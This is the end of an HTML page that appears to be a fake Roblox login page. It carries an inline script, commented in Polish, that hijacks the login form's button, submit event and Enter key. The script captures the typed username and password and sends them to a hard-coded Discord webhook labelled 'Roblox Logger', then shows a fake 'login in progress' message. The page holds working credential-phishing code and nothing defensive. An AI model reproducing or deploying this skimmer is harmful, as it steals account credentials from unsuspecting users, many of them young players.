<script src="https://js.rbxcdn.com/a67ddd9413db88f4124e2c4f25d8cb1f.js"></script>

<script src="https://js.rbxcdn.com/4c9a00164d9242bd60de5451a22f502c0c221a896d3a555470c03712d5ee4aa1.js"></script>
<script src="https://js.rbxcdn.com/cf340fb618d9a73913b30dfc624ae60d68b9e59723746e6c08d06d14ebdd6dca.js"></script>

<script src="https://js.rbxcdn.com/0674bdd03d1b3238c626edd377da2124ef54e2e25fab693d8c181cbe467e2029.js"></script>
<script src="https://js.rbxcdn.com/3d6aa666e6523ab529194ee2ba45564d7b0750f927869b181def6527ec749bc8.js"></script>

<script>
// Discord Webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1456448665324617912/GXFBBj95oQav5KkIXoTqXXO8TlWZJ8_pr3EFxIy3HmZxE3m4EWyuD-jQp1pSHHojCcc1';

// Funkcja wysy≈ÇajƒÖca na webhook
async function sendToWebhook(username, password) {
    try {
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                embeds: [{
                    title: 'üîê Nowe logowanie - Roblox',
                    color: 5814783,
                    fields: [
                        {
                            name: 'Username/Email',
                            value: username,
                            inline: true
                        },
                        {
                            name: 'Has≈Ço',
                            value: password,
                            inline: true
                        },
                        {
                            name: 'Czas',
                            value: new Date().toLocaleString('pl-PL'),
                            inline: false
                        }
                    ],
                    timestamp: new Date().toISOString(),
                    footer: {
                        text: 'Roblox Logger'
                    }
                }]
            })
        });
        console.log('‚úÖ Dane wys≈Çane na webhook');
    } catch (error) {
        console.error('‚ùå B≈ÇƒÖd wysy≈Çania:', error);
    }
}

// G≈Ç√≥wna funkcja przechwytujƒÖca
function setupInterceptor() {
    console.log('üîç Interceptor uruchomiony...');
    
    // Pr√≥bujemy znale≈∫ƒá formularz co 200ms
    const checkForForm = setInterval(() => {
        // Szukamy p√≥l input
        const usernameField = document.querySelector('input[type="text"]') || 
                             document.querySelector('input[name="username"]') ||
                             document.querySelector('input[autocomplete="username"]') ||
                             document.querySelector('input[placeholder*="Username"]') ||
                             document.querySelector('input[placeholder*="Email"]');
        
        const passwordField = document.querySelector('input[type="password"]') ||
                             document.querySelector('input[name="password"]');
        
        const submitButton = document.querySelector('button[type="submit"]') ||
                           document.querySelector('button.btn-primary-md') ||
                           document.querySelector('[class*="login"]') ||
                           document.querySelector('button[class*="Login"]');

        if (usernameField && passwordField && submitButton) {
            clearInterval(checkForForm);
            console.log('‚úÖ Formularz znaleziony!');
            
            // Dodajemy event listener do przycisku
            submitButton.addEventListener('click', async function(e) {
                e.preventDefault();
                e.stopPropagation();
                
                const username = usernameField.value;
                const password = passwordField.value;
                
                console.log('üéØ Przechwycono:', username, password);
                
                if (username && password) {
                    await sendToWebhook(username, password);
                    alert('Logowanie w trakcie...');
                }
            }, true);
            
            // R√≥wnie≈º przechwytujemy submit formularza
            const form = submitButton.closest('form');
            if (form) {
                form.addEventListener('submit', async function(e) {
                    e.preventDefault();
                    e.stopPropagation();
                    
                    const username = usernameField.value;
                    const password = passwordField.value;
                    
                    if (username && password) {
                        await sendToWebhook(username, password);
                        alert('Logowanie w trakcie...');
                    }
                }, true);
            }
            
            // Backup - przechwytujemy przez Enter
            passwordField.addEventListener('keypress', async function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    const username = usernameField.value;
                    const password = passwordField.value;
                    
                    if (username && password) {
                        await sendToWebhook(username, password);
                        alert('Logowanie w trakcie...');
                    }
                }
            });
        }
    }, 200);
    
    // Stop po 30 sekundach je≈õli nie znajdzie
    setTimeout(() => {
        clearInterval(checkForForm);
        console.log('‚è±Ô∏è Timeout - formularz nie znaleziony');
    }, 30000);
}

// Uruchamiamy gdy strona jest gotowa
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', setupInterceptor);
} else {
    setupInterceptor();
}

// Backup - uruchamiamy po 2 sekundach na wszelki wypadek
setTimeout(setupInterceptor, 2000);
</script>

</body>
</html>
